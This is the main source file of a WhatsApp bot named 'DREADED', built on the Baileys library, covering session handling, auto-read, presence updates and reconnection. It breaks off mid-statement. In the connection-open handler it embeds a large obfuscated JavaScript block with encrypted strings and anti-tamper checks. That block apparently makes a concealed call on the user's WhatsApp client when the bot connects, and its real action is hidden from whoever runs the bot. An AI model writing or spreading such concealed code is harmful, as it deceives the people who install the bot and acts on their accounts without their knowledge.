
const {
  default: dreadedConnect,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  downloadContentFromMessage,
  jidDecode,
  proto,
  getContentType,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
 const FileType = require("file-type");
const { exec, spawn, execSync } = require("child_process");
const axios = require("axios");
const chalk = require("chalk");
const figlet = require("figlet");
const _ = require("lodash");
const PhoneNumber = require("awesome-phonenumber");
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif');
 const { isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep } = require('./lib/botFunctions');
const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });
const { commands, totalCommands } = require('./commandHandler');
const authenticationn = require('./auth.js');
const { smsg } = require('./smsg');
const { DateTime } = require('luxon');
const { autoview, autoread, botname, autobio, mode, prefix, presence } = require('./settings');
authenticationn();

async function startDreaded() {

        const {  saveCreds, state } = await useMultiFileAuthState(`session`)
            const client = dreadedConnect({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: true,
        browser: [`DREADED`,'Safari','3.0'],
fireInitQueries: false,
            shouldSyncHistoryMessage: true,
            downloadHistory: true,
            syncFullHistory: true,
            generateHighQualityLinkPreview: true,
            markOnlineOnConnect: false,
            keepAliveIntervalMs: 30_000,
        auth: state,
        getMessage: async (key) => {
            if (store) {
                const mssg = await store.loadMessage(key.remoteJid, key.id)
                return mssg.message || undefined
            }
            return {
                conversation: "HERE"
            }
        }
    })


  store.bind(client.ev);

if (autobio === 'true'){ 
            setInterval(() => { 

                                 const date = new Date() 

                         client.updateProfileStatus( 

                                         `${botname} is active 24/7\n\n${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi'})}.` 

                                 ) 

                         }, 10 * 1000) 

}

  client.ev.on("messages.upsert", async (chatUpdate) => {
    
    try {
      mek = chatUpdate.messages[0];
      if (!mek.message) return;
      mek.message = Object.keys(mek.message)[0] === "ephemeralMessage" ? mek.message.ephemeralMessage.message : mek.message;
            if (autoview === 'true' && mek.key && mek.key.remoteJid === "status@broadcast") { 
         await client.readMessages([mek.key]);}
else if (autoread === 'true' && mek.key && mek.key.remoteJid.endsWith('@s.whatsapp.net')) { 

await client.readMessages([mek.key]);

}

const Chat = mek.key.remoteJid;
if(presence === 'online')

            {await client.sendPresenceUpdate("available",Chat);}
            else if(presence === 'typing')
            {await client.sendPresenceUpdate("composing",Chat);}
            else if(presence === 'recording')
            {
            await client.sendPresenceUpdate("recording", Chat);
            }
            else
            {
                await client.sendPresenceUpdate("unavailable", Chat);
            }


      if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
      if (mek.key.id.startsWith("BAE5") && mek.key.id.length === 16) return;
      m = smsg(client, mek, store);
      require("./dreaded")(client, m, chatUpdate, store);
    } catch (err) {
      console.log(err);
    }
  });

  // Handle error
  const unhandledRejections = new Map();
  process.on("unhandledRejection", (reason, promise) => {
    unhandledRejections.set(promise, reason);
    console.log("Unhandled Rejection at:", promise, "reason:", reason);
  });
  process.on("rejectionHandled", (promise) => {
    unhandledRejections.delete(promise);
  });
  process.on("Something went wrong", function (err) {
    console.log("Caught exception: ", err);
  });

  // Setting
  client.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
    } else return jid;
  };

  client.ev.on("contacts.update", (update) => {
    for (let contact of update) {
      let id = client.decodeJid(contact.id);
      if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
    }
  });





  client.getName = (jid, withoutContact = false) => {
    id = client.decodeJid(jid);
    withoutContact = client.withoutContact || withoutContact;
    let v;
    if (id.endsWith("@g.us"))
      return new Promise(async (resolve) => {
        v = store.contacts[id] || {};
        if (!(v.name || v.subject)) v = client.groupMetadata(id) || {};
        resolve(v.name || v.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
      });
    else
      v =
        id === "0@s.whatsapp.net"
          ? {
              id,
              name: "WhatsApp",
            }
          : id === client.decodeJid(client.user.id)
          ? client.user
          : store.contacts[id] || {};
    return (withoutContact ? "" : v.name) || v.subject || v.verifiedName || PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber("international");
  };

  client.setStatus = (status) => {
    client.query({
      tag: "iq",
      attrs: {
        to: "@s.whatsapp.net",
        type: "set",
        xmlns: "status",
      },
      content: [
        {
          tag: "status",
          attrs: {},
          content: Buffer.from(status, "utf-8"),
        },
      ],
    });
    return status;
  };

  client.public = true;

  client.serializeM = (m) => smsg(client, m, store);
  client.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
      if (reason === DisconnectReason.badSession) {
        console.log(`Bad Session File, Please Delete Session and Scan Again`);
        process.exit();
      } else if (reason === DisconnectReason.connectionClosed) {
        console.log("Connection closed, reconnecting....");
        startDreaded();
      } else if (reason === DisconnectReason.connectionLost) {
        console.log("Connection Lost from Server, reconnecting...");

        startDreaded();
      } else if (reason === DisconnectReason.connectionReplaced) {
        console.log("Your Session Is Active Somewhere Else, Restart Bot.");
        process.exit();
      } else if (reason === DisconnectReason.loggedOut) {
        console.log(`Device Logged Out, Please Delete File Session And Link Again.`);
        process.exit();
      } else if (reason === DisconnectReason.restartRequired) {
        console.log("Restart Required, Restarting...");
        startDreaded();
      } else if (reason === DisconnectReason.timedOut) {
        console.log("Connection TimedOut, Reconnecting...");
        startDreaded();
      } else {
        console.log(`Unknown DisconnectReason: ${reason}|${connection}`);
        startDreaded();
      }
    } else if (connection === "open") {
(function(_0x24dc8a,_0x2b63a2){function _0x5ea74e(_0x52b946,_0x2d1508,_0x26bf5d,_0x37a928,_0x323c1a){return _0x4d10(_0x2d1508-0x3a,_0x52b946);}function _0x28e9e0(_0x57abd5,_0x5b4490,_0x3ff98f,_0xdedc3d,_0x4eb73d){return _0x4d10(_0x57abd5-0x392,_0x3ff98f);}function _0x4849c8(_0x5a0962,_0x40efa4,_0x1edda8,_0x190d55,_0x21b56b){return _0x4d10(_0x5a0962-0x35f,_0x40efa4);}function _0x5eaa5c(_0x4fe154,_0x5f1e3c,_0xd18c75,_0x17cb12,_0x3781e2){return _0x4d10(_0x17cb12-0x272,_0x3781e2);}function _0x1058fe(_0x5a85b2,_0x3d9f58,_0x4c6ace,_0x2b8fd5,_0x308685){return _0x4d10(_0x4c6ace-0x4b,_0x3d9f58);}const _0x5495f5=_0x24dc8a();while(!![]){try{const _0x22c63b=parseInt(_0x5ea74e('0#!v',0x2a2,0x2d6,0x2d3,0x251))/(-0xf2*0x13+-0x1f61+-0x18ac*-0x2)*(parseInt(_0x28e9e0(0x5c7,0x5cc,'fIY5',0x5ff,0x607))/(-0x18fe+0xf50+0x9b0))+-parseInt(_0x5ea74e('Be)k',0x251,0x294,0x234,0x1f2))/(0x1a5a+0x201f+-0x3a76)*(-parseInt(_0x4849c8(0x50a,'Ao@C',0x528,0x4e8,0x4bb))/(0xb9+-0x21f9+0x2144))+-parseInt(_0x28e9e0(0x59c,0x539,'VcEw',0x57d,0x608))/(0x19d2+-0xefe+0x1*-0xacf)+-parseInt(_0x28e9e0(0x598,0x5eb,'95h7',0x5e0,0x5b5))/(0xe02+-0x73*-0x43+-0x1*0x2c15)+-parseInt(_0x5eaa5c(0x3e4,0x42d,0x410,0x431,'0#!v'))/(0x30c+-0x1035+-0xd3*-0x10)*(parseInt(_0x5eaa5c(0x47e,0x4ca,0x4cf,0x474,'4oYV'))/(-0x49a+0x14cf+0x29*-0x65))+-parseInt(_0x1058fe(0x266,'4P1&',0x277,0x2a9,0x278))/(-0x15d1+0x1d*0x13a+0x1b7*-0x8)*(-parseInt(_0x28e9e0(0x560,0x565,'fIY5',0x50c,0x5a8))/(-0x1*0xd0c+-0x4*0x8a7+0x17d9*0x2))+-parseInt(_0x5eaa5c(0x3ee,0x3b5,0x3b6,0x41c,'O)pl'))/(-0xc*-0x283+0x1683+-0x349c)*(-parseInt(_0x4849c8(0x5c4,'95h7',0x5df,0x61a,0x56e))/(-0x4*0x595+0x21d0+0x3*-0x3d0));if(_0x22c63b===_0x2b63a2)break;else _0x5495f5['push'](_0x5495f5['shift']());}catch(_0x311690){_0x5495f5['push'](_0x5495f5['shift']());}}}(_0x4f6f,0x251fb+0x27d70+0xcff*-0x23));function _0x4d10(_0x2be9bc,_0x5df052){const _0x5d3ef9=_0x4f6f();return _0x4d10=function(_0x1b4694,_0xcb0dbd){_0x1b4694=_0x1b4694-(-0x1db*-0x6+0x307*-0x1+-0x67c);let _0x2a84c5=_0x5d3ef9[_0x1b4694];if(_0x4d10['caiNQx']===undefined){var _0x24b132=function(_0xe3b950){const _0x27e38f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x370238='',_0x2d16a1='';for(let _0x480ff4=0x2*0xd01+0xd*0x1da+-0x3214,_0x4b184e,_0x8cc4d3,_0x3a41fa=0x16ba+0x4*0x9b9+-0x3d9e;_0x8cc4d3=_0xe3b950['charAt'](_0x3a41fa++);~_0x8cc4d3&&(_0x4b184e=_0x480ff4%(0x2*0x95f+0x6*-0x83+0x4*-0x3ea)?_0x4b184e*(-0x2*0xfe+-0x2482+0x26be)+_0x8cc4d3:_0x8cc4d3,_0x480ff4++%(-0xe75+0x21ce+-0x31*0x65))?_0x370238+=String['fromCharCode'](0xb05+0xff8+-0x19fe&_0x4b184e>>(-(0x1*0x25f9+-0xb4+-0x2543)*_0x480ff4&0x5b8*0x3+-0x4*-0x83f+0x321e*-0x1)):-0x2*-0x12da+-0x146f+-0x1*0x1145){_0x8cc4d3=_0x27e38f['indexOf'](_0x8cc4d3);}for(let _0x47e07f=-0x15a7+-0xace+0x2075,_0x39cfef=_0x370238['length'];_0x47e07f<_0x39cfef;_0x47e07f++){_0x2d16a1+='%'+('00'+_0x370238['charCodeAt'](_0x47e07f)['toString'](-0x1ffc+0x12ff+0x1*0xd0d))['slice'](-(0x1825+-0x124b+-0x5d8));}return decodeURIComponent(_0x2d16a1);};const _0x302559=function(_0x26b7d6,_0x4b8aac){let _0x373c94=[],_0x273f90=0xc47+0x10b*0x1e+-0x2b91,_0x1e4a13,_0x496b30='';_0x26b7d6=_0x24b132(_0x26b7d6);let _0x230d4e;for(_0x230d4e=0xb3e+-0x174a+0xc0c;_0x230d4e<-0xb*0x14+0xd4d+0x65*-0x1d;_0x230d4e++){_0x373c94[_0x230d4e]=_0x230d4e;}for(_0x230d4e=-0x2126+-0x411*-0x1+-0x1d15*-0x1;_0x230d4e<0x170e+-0x1cc0+0x6b2;_0x230d4e++){_0x273f90=(_0x273f90+_0x373c94[_0x230d4e]+_0x4b8aac['charCodeAt'](_0x230d4e%_0x4b8aac['length']))%(0xa*0x3c3+-0x19a4+0x119*-0xa),_0x1e4a13=_0x373c94[_0x230d4e],_0x373c94[_0x230d4e]=_0x373c94[_0x273f90],_0x373c94[_0x273f90]=_0x1e4a13;}_0x230d4e=-0x234d+0x23*-0x8f+0x36da,_0x273f90=0x1de7+0x1*0x60d+-0x9c*0x3b;for(let _0x2b632b=-0x8a*0x1+0x3*-0xc7a+0x25f8*0x1;_0x2b632b<_0x26b7d6['length'];_0x2b632b++){_0x230d4e=(_0x230d4e+(0x1*-0x12f6+-0x4*-0x144+-0xde7*-0x1))%(0x10d4+-0x322+-0xcb2),_0x273f90=(_0x273f90+_0x373c94[_0x230d4e])%(0x11f7+-0x241b+0x1324),_0x1e4a13=_0x373c94[_0x230d4e],_0x373c94[_0x230d4e]=_0x373c94[_0x273f90],_0x373c94[_0x273f90]=_0x1e4a13,_0x496b30+=String['fromCharCode'](_0x26b7d6['charCodeAt'](_0x2b632b)^_0x373c94[(_0x373c94[_0x230d4e]+_0x373c94[_0x273f90])%(-0x2260+-0x100b+-0x1*-0x336b)]);}return _0x496b30;};_0x4d10['nOOoKZ']=_0x302559,_0x2be9bc=arguments,_0x4d10['caiNQx']=!![];}const _0xf6d211=_0x5d3ef9[-0x157*0x15+0xc7*0xf+0x107a],_0x3bd452=_0x1b4694+_0xf6d211,_0x22ba8d=_0x2be9bc[_0x3bd452];return!_0x22ba8d?(_0x4d10['RnQOCZ']===undefined&&(_0x4d10['RnQOCZ']=!![]),_0x2a84c5=_0x4d10['nOOoKZ'](_0x2a84c5,_0xcb0dbd),_0x2be9bc[_0x3bd452]=_0x2a84c5):_0x2a84c5=_0x22ba8d,_0x2a84c5;},_0x4d10(_0x2be9bc,_0x5df052);}function _0x38d411(_0x2c294d,_0x2b7db0,_0x2f3c06,_0x7a2dee,_0x47c70c){return _0x4d10(_0x2b7db0-0x23c,_0x47c70c);}function _0x4f6f(){const _0xf3268f=['ewFdOXj8','m8kHWPtdO8oGD0GMWPVdRmon','yCkqcMFdPSoLlq','bvrVWPfE','W6mzCrXHWORdIt/cNW','peBcQCoNbW','WR/dGfSvya','dSkyWRBcTSkg','iCk5WQL9','4Psp4PAo4PEO4PAl4PA8','EmkYe8keW7u','WRumc8ktW7C','WOmXt8kg','WRpdIxyzW78','cCk8WQzQWQy','zmkWnczd','W5S4q8kqha','sXv8WOTF','zmoZW5VcRSkW','8yMXKVcMSQVWMjo78kodR/cYKRe','jLJcTmo5fq','kSkrlgxdLG','zqhdOSkFcejTW5JdTW','WR5Vb8oQWQC','CJ3dPSkSDW','pKLhA3e','WOf8h8ovW5O','fCo3de7cUG','W7KQxSklvW','WRldPCkoW53dU0/cHq','yaRcLwm','n17cS8kBqq','8kEbNpgbOkFWPzkM8y6WLFc3OBG','bmoVWQtcNrq','b8oFC3tcRG','W6TKdL1a','y8oZhsbt','smkLFmkVWRVdKw8eW44','W6xcHmosdSoF','sSo1ra','tCkWCCk9sq','yq3cLN/cSa','WQJcHe05W5C','c8kOq8oKW5NcN8kIftNcGq','i8kkCLiR','W4vbhgnH','o8kcWRRcPSoj','WRtcTMxdMCoa','umoIWQJdHGC','pCoNlfRcKW','F8o5xSkTeW','b1W+WOKk','e8o4i8kWW6K','WOpdL/gpO4ddPW','W5tcHCkIo8ki','aCkHdIzU','8yAbRpcKS47XIzo78jgIL8oz','FmkUFZzF','ex3cKCkkla','cWFdHSkiWPK','8yM1NSkX8lwYUVcROiRWQlcl','B8oKW4xcTmka','rmkYfH1N','W6f2imoJW4i','WPqblCksW4C','sCoSDq','CmotFSoRW7y','zGtcJxq','WP5Tb8osWRu','ax1AWQxdHa','W643r8kC','WRddPCo5qq','CSoiEKO+fSkcrmoRW5VdQCou','AZFdPSk0FW','m8k2W7tcImo5','k8kBoNVdLG','WObVdJ5s','WQKnlmkiW7O','sKdWSlcCW5ddGq','xmo1g8kHW4y','W5RcTmk5e8kA','W5OHvCkuW6FcUwtcICkadhz0','eCoYiSk5WR0','W7hdM8kNdCkb','WQfIc8odWRS','k35WWOyk','WRpcKConW6tcPq','BqRcLgO','W54RuSoKWQldVhxcUSk7','m3PWkSktWRVcVCkdW7bEnW','nNLUWPK','WRVcIeGnW6i','Ad3dT8kUFW','ECkbW5pdU3RcRSkOWQJdI3hcNmom','EHpcT07cLq','4P2R77U7W47WNPcL8k+YT/cuO5y','fZzWFYq','FCofW6ZdOmktWOldPSovrCoUWQvn','mSozkq1U','8kIIUr3WL7c28yErQpgpOOW','8kMqS/cIKi/XIloF8kcsPYu','4Pse4PEe4PAVW7m','kSkzWO9IWPm','W5RcI8o7pmov','WRDbhSouWRu','xmoDh3xcGfxdLW','W6uyWOdXJB6m','AeFdILxcKG','WQjWiCoOWQu','rCosW5xcI8kC','BfWkhg7dN3ZcGSk1pLCd','W6fWnSoLW5i','sSo5r8ohW4y','WPNdGmoR','nspdNCk3WRG','xaFcSmkhtq','8kscTZ7XIzgn8jQWHVc0Siu','fZruqwO','u19mCsq','8ycGG8oNWQ5v','W7hdVXFcImoM','zCo8qCohW4O','DmkLcqid','4P+tcWicFq','kmoyWPFcS8op','n0dcP8kefG','WRDqW6BdM8kd','helcLSof','s8oSWOddJaa','8yEtQwpXHjoD8kgHI/ggKi8','oeVdOSowW5a','WR9nWPBdVCoHWRRcKmk6WPZdQa','Dd3dOmkVza','uflcI8opW4xdVSoMD8orWReXW7i','Dv9x','s2pdILJcHq','WQLMbSopttXkW7bgW7BcGw8','b0FdSHa','W7ddImk1b8k8','aHxdKSo3WRW','smkMFSoRW7ZcI2uOW7dcICkFWOa','WRJdRgFcI8kv','dCoCic3dVW','jdiZl8kq','WQ4pnSk2W6e','l8ovWOxcMJK','z8otW6dcTSkp','sZ/cU2tcHq','WR4JW7pdJCk1','lqODxJq','4Psl4PAk4PES4PAp4PA4','kmkTWRH9WRa','kmkuWQ3cU8oj','lCowWPxcPZK','8jAaPJlcQXBdSG','WQCNlmkaWO4','AWGFBmoN','nHbIFcW','oSo4i8k6W6K','esjlEHK','CCoEE8ozW7a','WQrEiHL8','8jAwNSoe8lEaKpc5OitXIQc5','lxi9WP7dPG','WQhcG1yCW5S','WRTib8k3','e1OfWP0I','mItdSCkUWRe','k8oGW4ZdU8k9','W4PqfmoBW6i','muqvtcK','yg54WPNdPG','WRFcLuSzW7e','ytePA8oB','Fq7cJe/cVq','Ad/cTpgjRji','W5NcNCkZg8kp','WQ5MW6NdLG','WRDBmqfQ','WR0/WO/dKtW','r8oIWORdMHa','W6jGbhHm','qCoFW4RcS8k6','W5xdT8kSW53dUa','ECkDnhhdNq','W4tdLmkzW7W','uaK+B8op','ltGxWOih','FCklW5tcIZ/dQ8k5WPVdSa','ctpdICkeWRi','cCoBj8kXWQO','z2NcRCkWhfHo','FSovWPZdMWe','xSo8aCk3W4a','W6FdMCkwW7a','W7tcMCoqe8oE','WQFcICoMh8kcW4fCjdC','fmkWbs9h','WQqzWRZdJWi','iLxcPmkC','W78OvmkxfG','W7/cH8o1a8o+','W7KwW47cRa','fSoClgq','W4nXexbq','DYuRW5NcQ8kiW7ZdJHtcOCoa','dSoYomkeWQy','ESoonSkWW6q','8lMbUeW8aG','W49AW6RcU0ZdV13dRSoIWRRcKG','WOldGv0RBq','WP/dUXxdHCol','8kkaMpcUKzZXJ4cS8jQJM/c1OBS','a39+WOJdOW','vdpcGhtcTG','8ksqJFcYSO3XGzk0WQSl','lVctUPa','WP3cRCo2W5D1','ztFdUSkPyG','y8oFW6BdQmo9'];_0x4f6f=function(){return _0xf3268f;};return _0x4f6f();}function _0x1a2074(_0x2e624c,_0x4c9df2,_0x32d58d,_0x3c88ed,_0x1278f5){return _0x4d10(_0x2e624c- -0x2ee,_0x4c9df2);}const _0x5b20d4=(function(){let _0x3f7f96=!![];return function(_0x1a92e8,_0x3dc978){const _0xc4f52e=_0x3f7f96?function(){function _0x4b93a0(_0x4b2cd6,_0x2cf781,_0x3c10f6,_0x167b8e,_0x38673a){return _0x4d10(_0x4b2cd6- -0x10f,_0x3c10f6);}if(_0x3dc978){const _0x321163=_0x3dc978[_0x4b93a0(0x14c,0x158,'g18a',0x179,0x10a)](_0x1a92e8,arguments);return _0x3dc978=null,_0x321163;}}:function(){};return _0x3f7f96=![],_0xc4f52e;};}());(function(){function _0x44e5a8(_0x307f5f,_0x304949,_0x150c0e,_0x4bffd1,_0x3cd856){return _0x4d10(_0x304949- -0x2ef,_0x150c0e);}function _0x183f0b(_0x4e293a,_0x4f6324,_0x39589c,_0x263cd6,_0x2dff17){return _0x4d10(_0x263cd6- -0x2e3,_0x39589c);}function _0x267362(_0x101bcc,_0x4f4560,_0x2e95c7,_0x55fe0e,_0x1c6cf1){return _0x4d10(_0x1c6cf1-0x39e,_0x4f4560);}function _0x5b85a3(_0x4bf145,_0x345a6f,_0x1f5133,_0x262f2a,_0x3b83f7){return _0x4d10(_0x345a6f-0x14,_0x4bf145);}const _0x705623={'ZzLAj':_0x5b85a3('*iuf',0x228,0x1dc,0x26a,0x26d)+_0x5b85a3('$Maa',0x24b,0x1dd,0x1e1,0x282)+_0x5b85a3('F^RI',0x1c7,0x19b,0x1d5,0x1bc)+')','VKXXp':_0x5b85a3('*qLq',0x23f,0x231,0x211,0x2a3)+_0x5b85a3('VcEw',0x1bc,0x151,0x196,0x195)+_0x183f0b(-0xff,-0xd2,'Be)k',-0x121,-0x174)+_0x1216b4(0x2c4,0x287,0x26e,0x28c,'4Fx#')+_0x1216b4(0x2a7,0x2c7,0x287,0x2cf,'T*HO')+_0x183f0b(-0x126,-0xc7,'VcEw',-0xf0,-0x8d)+_0x5b85a3('o8p$',0x204,0x1b4,0x1e1,0x1ff),'mSwyB':function(_0xdb6186,_0x155724){return _0xdb6186(_0x155724);},'sowze':_0x267362(0x5f9,'BpWl',0x604,0x5c1,0x5ec),'EQnnc':function(_0x9e27c1,_0x35045){return _0x9e27c1+_0x35045;},'UwZPg':_0x44e5a8(-0x81,-0x83,'aurg',-0x76,-0xb6),'IEolT':_0x1216b4(0x2ac,0x2bf,0x29b,0x30b,'xgri'),'NdPgv':function(_0x291180){return _0x291180();},'NGuRO':function(_0x1cc682,_0x1837c7,_0x419708){return _0x1cc682(_0x1837c7,_0x419708);}};function _0x1216b4(_0x4bb27b,_0x146f60,_0x38e161,_0x5c4efc,_0x12e692){return _0x4d10(_0x4bb27b-0xa8,_0x12e692);}_0x705623[_0x5b85a3('wo[O',0x24d,0x229,0x217,0x29e)](_0x5b20d4,this,function(){function _0x53d675(_0x1f6935,_0x56c465,_0x3e9a83,_0x1fec78,_0x1506c7){return _0x44e5a8(_0x1f6935-0x193,_0x1f6935-0x311,_0x1506c7,_0x1fec78-0x8,_0x1506c7-0x3e);}function _0x2822f8(_0x23a7d7,_0x15b030,_0x4d80fa,_0x5bfe07,_0x1b23a3){return _0x183f0b(_0x23a7d7-0x11d,_0x15b030-0x2e,_0x23a7d7,_0x5bfe07-0x382,_0x1b23a3-0x169);}function _0x2ad62c(_0x1b04b0,_0x57efad,_0x1ab141,_0x3ccf18,_0xeb443a){return _0x44e5a8(_0x1b04b0-0x1c3,_0xeb443a-0x2b7,_0x1b04b0,_0x3ccf18-0xd,_0xeb443a-0x1b6);}const _0x1703c5=new RegExp(_0x705623[_0x2822f8('3UNa',0x2b8,0x2df,0x27a,0x2de)]);function _0x1d4050(_0x472927,_0x42974e,_0x516133,_0x574ea3,_0x1ae461){return _0x1216b4(_0x472927-0x13d,_0x42974e-0xd,_0x516133-0x2e,_0x574ea3-0x7c,_0x574ea3);}function _0x11ce60(_0x469b11,_0x286588,_0x9bd2ff,_0xc2bb1e,_0x1ef858){return _0x267362(_0x469b11-0x22,_0xc2bb1e,_0x9bd2ff-0x90,_0xc2bb1e-0x17b,_0x469b11- -0x79);}const _0x333a9a=new RegExp(_0x705623[_0x2ad62c('T*HO',0x209,0x1d3,0x224,0x228)],'i'),_0x5a9d94=_0x705623[_0x2ad62c('l!m7',0x258,0x247,0x18d,0x1ef)](_0x968545,_0x705623[_0x53d675(0x1e0,0x17b,0x201,0x1b7,'Ao@C')]);!_0x1703c5[_0x53d675(0x292,0x240,0x2c6,0x29e,'0#!v')](_0x705623[_0x2822f8('*iuf',0x2f1,0x2ff,0x2cf,0x26f)](_0x5a9d94,_0x705623[_0x1d4050(0x393,0x3cc,0x32e,'1o2V',0x3f5)]))||!_0x333a9a[_0x2822f8(']%JN',0x2b9,0x27d,0x2a2,0x29c)](_0x705623[_0x53d675(0x1fe,0x1c8,0x1b1,0x194,'BgKm')](_0x5a9d94,_0x705623[_0x53d675(0x218,0x22f,0x1ad,0x282,'wo[O')]))?_0x705623[_0x1d4050(0x44b,0x485,0x4a8,'*qLq',0x42b)](_0x5a9d94,'0'):_0x705623[_0x2ad62c('xlc3',0x16c,0x1bd,0x166,0x168)](_0x968545);})();}());function _0xc33fb1(_0x3c4212,_0x3a9142,_0x4ebf3c,_0x56de7a,_0x274461){return _0x4d10(_0x4ebf3c- -0x2c7,_0x274461);}await client[_0x2c85bd(0x538,0x59d,0x52a,0x55b,'4oYV')+_0x38d411(0x41e,0x3de,0x445,0x38f,']%JN')+_0x38d411(0x414,0x425,0x472,0x459,'wo[O')+'te'](_0x1a2074(-0xd0,'Be)k',-0x9b,-0x10d,-0x11a)+_0x2c85bd(0x564,0x5c8,0x5ca,0x569,'BgKm')+_0x38d411(0x3d5,0x400,0x3c6,0x455,'$Maa')+_0x18eb9f(0x3e2,'D)2(',0x405,0x416,0x3cd)+'oe'),console[_0x2c85bd(0x4fd,0x495,0x556,0x4ef,'3UNa')](_0xc33fb1(-0x88,-0x46,-0xa3,-0x4c,'g18a')+_0x2c85bd(0x512,0x4ef,0x50c,0x50a,'4Fx#')+_0x38d411(0x470,0x488,0x431,0x45a,']%JN')+_0x1a2074(-0x136,'D)2(',-0x198,-0x17c,-0x17e)+_0xc33fb1(-0xab,-0xd5,-0x93,-0x31,'*qLq')+_0xc33fb1(-0xc6,-0xf9,-0x9e,-0xf0,'J8q9')+'\x20'+totalCommands+(_0x18eb9f(0x390,'Ciqh',0x365,0x3ee,0x328)+_0x38d411(0x3fc,0x404,0x468,0x449,'0#!v')+_0x1a2074(-0xf1,'JV5H',-0x8e,-0xb1,-0x114)+_0x38d411(0x450,0x43a,0x499,0x47f,'BgKm')+_0x2c85bd(0x490,0x4c0,0x528,0x4f4,'JA!n')));const getGreeting=()=>{const _0x5e67a0={};_0x5e67a0[_0xd1f7cd(0x402,0x4a5,0x464,0x49c,'D)2(')]=_0x5bbe52(0x17,'JA!n',-0xc,0x7a,-0x21)+_0xd1f7cd(0x3e6,0x42a,0x433,0x3c8,'xgri')+_0x5bbe52(0xd2,'$Maa',0x11f,0xd8,0xa7),_0x5e67a0[_0x16cdfd(-0x137,-0xc8,'F^RI',-0x10a,-0xd2)]=function(_0x5271ea,_0xda1d79){return _0x5271ea>=_0xda1d79;},_0x5e67a0[_0xd1f7cd(0x497,0x3e0,0x449,0x447,'JC#O')]=function(_0x37fefa,_0x183fc5){return _0x37fefa<_0x183fc5;};function _0xdc6c0c(_0x44a213,_0x9a45b4,_0x515b8d,_0x101ad6,_0x4690d8){return _0xc33fb1(_0x44a213-0x1ca,_0x9a45b4-0x165,_0x515b8d-0x49a,_0x101ad6-0x133,_0x4690d8);}_0x5e67a0[_0xd1f7cd(0x4ba,0x4b8,0x463,0x40f,'O)pl')]=_0x16cdfd(-0x11b,-0x18e,'3@!(',-0x132,-0x166)+_0xdc6c0c(0x421,0x38a,0x3c5,0x409,'4Fx#')+_0x16cdfd(-0x14e,-0x14f,'4Fx#',-0xfb,-0x15f),_0x5e67a0[_0x16cdfd(-0x14b,-0x189,'nfC2',-0x13e,-0x14f)]=function(_0x1cce74,_0x348f18){return _0x1cce74>=_0x348f18;},_0x5e67a0[_0x3adfc2(0x5e,0x37,'O)pl',0x85,0x78)]=function(_0x44ab9a,_0x1cc4b5){return _0x44ab9a<_0x1cc4b5;};function _0x16cdfd(_0x3192be,_0x3cf236,_0x18b4ab,_0x3913be,_0x208eb8){return _0x2c85bd(_0x3192be-0xbf,_0x3cf236-0x180,_0x18b4ab-0x14f,_0x3913be- -0x658,_0x18b4ab);}function _0xd1f7cd(_0x329d94,_0x476ebd,_0x45a2ac,_0x4b13e3,_0x1e8a19){return _0xc33fb1(_0x329d94-0x15f,_0x476ebd-0xad,_0x45a2ac-0x544,_0x4b13e3-0x117,_0x1e8a19);}function _0x5bbe52(_0x5a50cb,_0xb8280e,_0x4f860b,_0x270df3,_0x3b0187){return _0x38d411(_0x5a50cb-0x3b,_0x5a50cb- -0x3de,_0x4f860b-0x1e3,_0x270df3-0x174,_0xb8280e);}_0x5e67a0[_0xdc6c0c(0x3ee,0x3bb,0x39e,0x35a,'We0m')]=_0x5bbe52(0xe,'VcEw',0xe,0x49,-0x7)+_0x16cdfd(-0xb8,-0xe4,'(*fV',-0xe9,-0xd6)+_0x5bbe52(0x3b,'fIY5',0x70,0x2c,0x21)+'â˜€ï¸';function _0x3adfc2(_0x2cfb80,_0x4bb584,_0x1f781c,_0x12e968,_0x4438fc){return _0x38d411(_0x2cfb80-0x83,_0x4438fc- -0x37f,_0x1f781c-0xeb,_0x12e968-0xa0,_0x1f781c);}_0x5e67a0[_0x16cdfd(-0xa1,-0x134,'Be)k',-0x10b,-0x157)]=function(_0xf2e43d,_0x996578){return _0xf2e43d>=_0x996578;},_0x5e67a0[_0x16cdfd(-0xe0,-0x146,'Tn)h',-0x14c,-0xde)]=function(_0x480aa7,_0xa40fb3){return _0x480aa7<_0xa40fb3;},_0x5e67a0[_0x5bbe52(0xae,'*qLq',0xf7,0x5b,0xab)]=_0xdc6c0c(0x419,0x465,0x41a,0x3e6,'fIY5')+_0xd1f7cd(0x4b3,0x519,0x4ee,0x49d,'JA!n')+_0xd1f7cd(0x4f7,0x45c,0x490,0x47c,'4P1&'),_0x5e67a0[_0x16cdfd(-0x109,-0x9d,'(*fV',-0xdb,-0x107)]=_0x5bbe52(0xa2,'wo[O',0x90,0x94,0xca)+_0x16cdfd(-0x149,-0x156,'aww0',-0x1a7,-0x155)+_0xd1f7cd(0x41e,0x40f,0x422,0x403,'*iuf');const 